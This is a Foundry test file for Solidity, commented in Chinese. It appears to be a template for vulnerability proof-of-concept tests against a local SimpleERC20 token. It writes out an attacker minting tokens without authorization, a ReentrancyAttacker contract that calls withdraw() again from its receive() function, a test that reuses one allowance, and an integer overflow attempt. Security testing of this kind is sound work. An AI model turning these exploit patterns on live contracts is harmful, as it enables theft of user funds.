// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {SimpleERC20} from "../src/SimpleERC20.sol";

/**
 * @title GorillaTest
 * @dev 功能完整的漏洞测试模板，包含所有可能需要的预定义
 */
contract GorillaTest is Test {
    // 核心状态变量
    SimpleERC20 public token;
    address public attacker;
    address public victim;
    address public user1;
    address public user2;
    address public owner;
    
    // 测试用的初始余额
    uint256 public constant INITIAL_SUPPLY = 1000000 * 10**18;
    uint256 public constant INITIAL_BALANCE = 10000 * 10**18;
    
    function setUp() public {
        // 设置测试账户
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        
        // 给所有账户分配ETH
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        
        // 部署代币合约
        vm.prank(owner);
        token = new SimpleERC20("VulnToken", "VULN", 18, INITIAL_SUPPLY / 10**18);
        
        // 给测试账户分配代币
        vm.startPrank(owner);
        token.transfer(victim, INITIAL_BALANCE);
        token.transfer(user1, INITIAL_BALANCE);
        token.transfer(user2, INITIAL_BALANCE);
        vm.stopPrank();
        
        // 给合约存入一些ETH用于withdraw测试
        vm.deal(address(token), 50 ether);
    }
    
    function testVulnerability() external {
        console.log("=== Starting Vulnerability Test ===");
        console.log("Token contract:", address(token));
        console.log("Attacker:", attacker);
        console.log("Victim:", victim);
        
        // 记录攻击前状态
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 contractEthBefore = address(token).balance;
        
        console.log("Before attack - Attacker balance:", attackerBalanceBefore);
        console.log("Before attack - Victim balance:", victimBalanceBefore);
        console.log("Before attack - Contract ETH:", contractEthBefore);
        
        // 模板变量注入点 - 具体的漏洞测试逻辑
        vm.prank(attacker);
        token.mint(attacker, 500000 * 10**18);
        
        // 记录攻击后状态
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 contractEthAfter = address(token).balance;
        
        console.log("After attack - Attacker balance:", attackerBalanceAfter);
        console.log("After attack - Victim balance:", victimBalanceAfter);
        console.log("After attack - Contract ETH:", contractEthAfter);
        
        // 模板变量注入点 - 漏洞验证断言
        assertTrue(token.balanceOf(attacker) == attackerBalanceBefore + 500000 * 10**18, "Attacker minted tokens without authorization");
        
        console.log("=== Vulnerability Test Completed ===");
    }
    
    // 预定义的辅助函数
    function _testReentrancyAttack() internal {
        // 重入攻击测试辅助函数
        ReentrancyAttacker attackContract = new ReentrancyAttacker(address(token));
        
        // 给攻击合约一些代币
        vm.prank(attacker);
        token.transfer(address(attackContract), 1 ether);
        
        // 执行重入攻击
        vm.prank(attacker);
        attackContract.attack();
    }
    
    function _testUnauthorizedMint() internal {
        // 未授权铸币测试
        uint256 mintAmount = 1000000 * 10**18;
        
        vm.prank(attacker);
        token.mint(attacker, mintAmount);
    }
    
    function _testAllowanceBypass() internal {
        // allowance绕过测试
        uint256 transferAmount = 1000 * 10**18;
        
        // victim给attacker授权少量代币
        vm.prank(victim);
        token.approve(attacker, transferAmount);
        
        // 尝试多次使用同一个授权
        vm.startPrank(attacker);
        token.transferFrom(victim, attacker, transferAmount);
        token.transferFrom(victim, attacker, transferAmount); // 应该失败但可能成功
        vm.stopPrank();
    }
    
    function _testIntegerOverflow() internal {
        // 整数溢出测试
        uint256 maxUint = type(uint256).max;
        
        vm.prank(attacker);
        // 尝试触发溢出
        try token.transfer(victim, maxUint) {
            // 如果成功，可能存在溢出漏洞
        } catch {
            // 正常应该失败
        }
    }
    
    // 辅助函数
    function _logBalances() internal view {
        console.log("Owner balance:", token.balanceOf(owner));
        console.log("Attacker balance:", token.balanceOf(attacker));
        console.log("Victim balance:", token.balanceOf(victim));
        console.log("User1 balance:", token.balanceOf(user1));
        console.log("User2 balance:", token.balanceOf(user2));
        console.log("Contract ETH balance:", address(token).balance);
    }
}

// 重入攻击合约
contract ReentrancyAttacker {
    SimpleERC20 public token;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 3;
    
    constructor(address _token) {
        token = SimpleERC20(payable(_token));
    }
    
    function attack() external {
        // 开始重入攻击
        token.withdraw();
    }
    
    receive() external payable {
        // 重入逻辑
        if (attackCount < MAX_ATTACKS && address(token).balance > 0) {
            attackCount++;
            token.withdraw();
        }
    }
}